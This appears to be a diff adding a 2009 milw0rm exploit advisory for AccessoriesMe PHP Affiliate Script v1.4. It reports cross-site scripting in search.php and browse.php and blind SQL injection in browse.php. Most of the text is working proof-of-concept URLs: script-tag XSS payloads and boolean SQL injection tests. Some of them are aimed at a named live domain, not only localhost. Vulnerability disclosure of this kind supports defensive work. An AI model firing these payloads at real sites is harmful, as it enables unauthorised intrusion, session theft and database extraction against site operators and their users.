@@ -1,0 +1,45 @@
+/*
+
+              _____       _ ___        __          
+             | ____|_   _(_) \ \      / /_ _ _   _ 
+             |  _| \ \ / / | |\ \ /\ / / _` | | | |
+             | |___ \ V /| | | \ V  V / (_| | |_| |
+             |_____| \_/ |_|_|  \_/\_/ \__,_|\__, |
+                                              |___/ 
+                                    _____                    
+                                   |_   _|__  __ _ _ __ ___  
+                                      | |/ _ \/ _` | '_ ` _ \ 
+                                      | |  __/ (_| | | | | | |
+                                      |_|\___|\__,_|_| |_| |_|
+
+AccessoriesMe PHP Affiliate Script v1.4 (bSQL-XSS) Multiple Remote Vulnerabilities
+
+Discovered By : Moudi
+Contact : <m0udi@9.cn>
+Download : http://www.accessories.me.uk/downloadscript/download.php?u=latest/PHPAffiliateScript.zip&f=database/Affiliate-Script.dat
+
+Greetings : Mizoz, Zuka, str0ke, 599eme Man.
+
+*/
+
+[+] Exploit XSS:
+
+- Vulnerable code in search.php (Keywords).
+- Vulnerable code in browse.php (SearchIndex).
+
+- Poc:
+  http://127.0.0.1/search.php?Keywords=[XSS]
+  http://127.0.0.1/browse.php?SearchIndex=[XSS]
+  http://ipod.accessories.me.uk/search.php?Keywords=1>"><ScRiPt %0D%0A>alert(412646446896)%3B</ScRiPt>
+  http://ipod.accessories.me.uk/browse.php?SearchIndex=1>"><ScRiPt %0D%0A>alert(412646446896)%3B</ScRiPt>
+
+[+] Exploit bSQL:
+
+- Vulnerable code in browse.php (SearchIndex).
+
+- Poc:
+  http://127.0.0.1/browse.php?SearchIndex=PCHardware&BrowseNode=[NB]&sort=psrank&Go=[bSQL]
+  http://ipod.accessories.me.uk/browse.php?SearchIndex=PCHardware&BrowseNode=3221551&sort=psrank&Go=Submit and 1=1 TRUE
+  http://ipod.accessories.me.uk/browse.php?SearchIndex=PCHardware&BrowseNode=3221551&sort=psrank&Go=Submit and 1=2 FALSE
+
+# milw0rm.com [2009-08-05]
